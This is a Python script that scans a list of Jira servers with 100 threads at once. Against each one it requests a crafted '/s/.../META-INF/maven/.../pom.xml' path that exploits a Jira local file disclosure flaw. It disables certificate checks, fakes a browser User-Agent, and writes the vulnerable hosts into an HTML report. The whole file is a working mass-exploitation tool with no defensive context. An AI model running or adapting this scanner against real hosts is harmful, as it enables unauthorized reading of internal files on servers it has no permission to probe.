# -*- coding: utf-8 -*-
import requests
from datetime import date
import sys
import threading
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import base64
import re
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
success=0
inFileName = "jira.txt"
sem = threading.Semaphore(100)
bar_len = 60
today = date.today()

def url200(url,urls):
    global success    
    try:            
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
        }
        r = requests.get(url=url, headers=headers, verify=False, timeout=10)
        if r.status_code == 200 and '<project xmlns=' in r.text: 
            # m = re.search('<web-app[\s\S]+<\/web-app>', r.text)
            success += 1            
            body = """<br>            
            <a href="%s" target="_blank">%s </a>
            """%(url,urls)

            doc.write(body)    
            
        
        # lock.acquire()
        
    except Exception as error:
        # lock.acquire()
        pass
    finally:
        sem.release() #解鎖這個線程，開始其他線程。
    
    
def run():
    num=1   
    f = open(inFileName)
    urls_data = f.readlines()
    total = str(len(urls_data))
    for urls in urls_data:
        sem.acquire()               
        url = urls.strip("\n") + "/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
        urls = urls.strip("\n") 
        t1 = Thread(target=url200,args=(url,urls))
        t1.start()
        
        filled_len = int(round(bar_len * (num+1) / float(total)))
        percents = round(100.0 * (num+1) / float(total), 1)
        bar = ['='] * filled_len + ['-'] * (bar_len - filled_len)
        sys.stdout.write('[%s] %s%s %s/%s success:%s\r' % (''.join(bar), percents, '%', num, total, success))
        sys.stdout.flush()
        num = num + 1
    t1.join()

    html2 = """
    </div>
    </body>
    </html>"""
    doc.write(html2)
    doc.close()

doc = open("jira_LFI_pom_result.html", "a+" ,encoding="UTF-8")
html1 = """
    <html>
    <head></head>
    <style>
    body {
        background-color: #2b2b2b;
        color: #ccc;
    }
    a {
        background-color: transparent;
        text-decoration: none;
        outline: 0;
    }
    a:link {
        color:#FF0000;
        text-decoration:underline;
    }
    a:visited {
        color:#00FF00;
        text-decoration:none;
    }
    a:hover {
        color:#000000;
        text-decoration:none;
    }
    a:active {
        color:#FFFFFF;
        text-decoration:none;
    }
    </style>
    <body>
    <div>"""
doc.write(html1)

run()
# outFile.close()
